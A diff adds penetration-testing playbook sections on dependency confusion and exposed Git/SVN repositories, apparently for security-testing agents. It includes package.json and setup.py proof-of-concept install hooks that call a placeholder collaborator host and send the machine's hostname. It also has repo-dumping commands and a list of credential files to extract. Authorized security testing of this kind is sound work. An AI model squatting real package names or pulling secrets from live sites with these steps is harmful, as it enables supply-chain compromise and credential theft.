@@ -665,3 +665,170 @@ grep -rn "SECRET_KEY_BASE" config/
 - **Forward-looking/unconfirmed items are flagged:** DOMPurify CVE-2025-26791, PHP `session.upload_progress` UAF (CVE-2026-109618/109619), Spring Boot heapdump CVE-2026-40976, feathersjs CVE-2026-27191, and HAProxy/chunk-extension smuggling CVEs are cited from advisory/blog sources dated 2025–2026 and should be re-verified against NVD/vendor advisories before weaponization.
 - **Defenses move the baseline.** Enforced IMDSv2 (hop limit 1), strict nonce/hash CSP without `unsafe-inline`, algorithm-pinned JWT verification, per-field GraphQL authorization, persisted-query allowlists, server-side image re-encoding, and `root`-over-`alias` nginx configs each neutralize entire technique families above; agents should test for the presence of these controls first to avoid wasted effort.
 - **WAF noise vs. true positives.** Status-code or length changes alone are unreliable — always corroborate with body-hash diffs and out-of-band confirmation (interactsh/Collaborator) before reporting, especially for blind SSRF, blind SQLi, blind command injection, and blind XSS.
+
+---
+
+## From hack-skills: Dependency Confusion Attacks
+
+### Core Concept
+
+Private package names can be squatted on public registries. When a build system merges public and private registries, it may prefer the higher-versioned public package — which the attacker controls and whose install scripts execute on the developer's machine.
+
+**Affected ecosystems:**
+- **npm**: `--extra-index-url` (pip) or `.npmrc` with scoped private registry — unscoped packages fetched from npmjs.com first if not scoped
+- **pip**: `--extra-index-url` merges both indexes; version comparison picks the higher one (attacker uploads `99.99.99`)
+- **RubyGems**: source order in `Gemfile` — first source wins
+- **Maven/Gradle**: repository declaration order
+- **Composer**: Packagist is default; private Satis only overrides if configured first
+- **Docker**: `FROM company/base-image` — squattable on Docker Hub
+
+### Recon: Finding Internal Package Names
+
+```bash
+# Committed manifests: package.json, requirements.txt, Gemfile, pom.xml, build.gradle
+grep -r "registry\|private\|internal\|corp\|company" package.json requirements.txt
+
+# Source maps / JS bundles (leak internal module names)
+# .npmrc / .yarnrc files in public repos → reveal private registry + scoped package names
+# CI/CD logs (GitHub Actions, CircleCI) may show install output with internal package names
+# Job postings, tech blog posts mentioning internal tooling names
+# GitHub issue tracker for the target org: bug reports mentioning package names
+```
+
+### Squatting Check (non-destructive)
+
+```bash
+# npm — check if public package exists:
+npm view INTERNAL-PACKAGE-NAME version 2>/dev/null || echo "NOT FOUND — squattable"
+
+# pip — verify package doesn't exist:
+python3 -m pip install --dry-run 'INTERNAL-PACKAGE-NAME==99.99.99' 2>&1 | grep -i "not found\|no matching"
+
+# RubyGems:
+gem search INTERNAL-GEM-NAME
+
+# Maven:
+mvn dependency:get -Dartifact=com.company:internal-artifact:99.99.99 2>&1 | grep -i "artifact not found"
+```
+
+### PoC Pattern (non-destructive, DNS/HTTP callback only)
+
+```json
+// package.json for squatted npm package (upload to npmjs.com as version 99.9.9):
+{
+  "name": "INTERNAL-PACKAGE-NAME",
+  "version": "99.9.9",
+  "description": "Security research package",
+  "scripts": {
+    "preinstall": "curl https://YOUR-BURP-COLLAB.oastify.com/dep-confusion/INTERNAL-PACKAGE-NAME"
+  }
+}
+```
+
+```python
+# setup.py for pip squatting:
+import os, urllib.request
+urllib.request.urlopen('https://YOUR-BURP-COLLAB.oastify.com/dep-confusion/' + os.getenv('HOSTNAME','unknown'))
+```
+
+**Key principle**: DNS/HTTP callback = proof of execution. Never add destructive payload.
+
+### Tools
+
+```bash
+pip install confused
+confused -l packages.txt    # checks npm, pip, RubyGems, composer at once
+
+pip install depfuzzer
+depfuzzer -f requirements.txt
+```
+
+### Dependency Confusion Decision Tree
+
+```
+Recon: find package manifest in codebase / job posts / CI logs
+  ↓
+Identify internal package names (not on public registry)
+  ↓
+Verify name is NOT already on public registry (squatting check)
+  ↓
+Register on public registry with version 99.9.9
+  ↓
+Add preinstall/postinstall with DNS/HTTP callback
+  ↓
+Wait for DNS/HTTP hit → confirms execution on developer machine / CI
+  ↓
+Report with callback log as PoC — NO destructive payload
+```
+
+---
+
+## From hack-skills: Insecure Source Code Management (Git/SVN Exposure)
+
+### Quick Detection Paths
+
+```bash
+# Git exposure
+/.git/HEAD                     → "ref: refs/heads/main" = exposed
+/.git/config                   → remote URLs, credentials
+/.git/logs/HEAD                → commit history (author names, emails)
+/.git/COMMIT_EDITMSG           → last commit message
+/.git/packed-refs              → all branch/tag refs
+
+# SVN
+/.svn/entries                  → pre-1.7: plaintext file list
+/.svn/wc.db                    → SQLite database with all file paths
+
+# Mercurial
+/.hg/requires                  → confirms Mercurial repo
+/.hg/hgrc                      → config (remote URL with credentials)
+
+# Other
+/.DS_Store                     → macOS directory listing (file names, paths)
+/backup.zip /backup.tar.gz     → full source dump
+/db.sql /dump.sql              → database dump
+/.env /.env.backup /.env.prod  → environment variables with secrets
+/config.php.bak /web.config.bak → config file backups
+```
+
+### Decision Tree: SCM Exposure
+
+```
+Check /.git/HEAD
+├── 403 → "ref: refs/..." returned? Git dir browsing blocked but file access open
+│   └── Try /.git/config → credentials/remote URL
+│   └── Try /.git/logs/HEAD → commit history
+│   └── Use git-dumper to reconstruct full repo
+├── 200 → Full directory listing? Use gittools/GitHacker to dump
+└── 404 → Check /.svn/entries then /.hg/requires then backup files
+
+Parallel: always check /.env, /backup.zip, /db.sql regardless
+```
+
+### Recovery Tools
+
+```bash
+# Git dumper (reconstructs repo from web-exposed .git)
+pip install git-dumper
+git-dumper http://target.com/.git/ /tmp/dumped-repo/
+cd /tmp/dumped-repo && git log --oneline
+
+# GitTools (Finder + Dumper + Extractor)
+./gittools/Dumper/gitdumper.sh http://target.com/.git/ /tmp/git-out/
+./gittools/Extractor/extractor.sh /tmp/git-out/ /tmp/extracted/
+
+# SVN extractor
+python3 svn-extractor.py --url http://target.com/.svn/ --out /tmp/svn-dump/
+```
+
+### High-Value Files to Extract
+
+```
+.git/config              → credentials in remote URL (https://user:pass@host)
+.env                     → DB passwords, API keys, JWT secrets
+wp-config.php            → WordPress DB credentials
+.aws/credentials         → AWS access keys
+.ssh/id_rsa              → SSH private key
+web.config               → .NET connection strings, secrets
+app/config/database.php  → Laravel DB credentials
+```
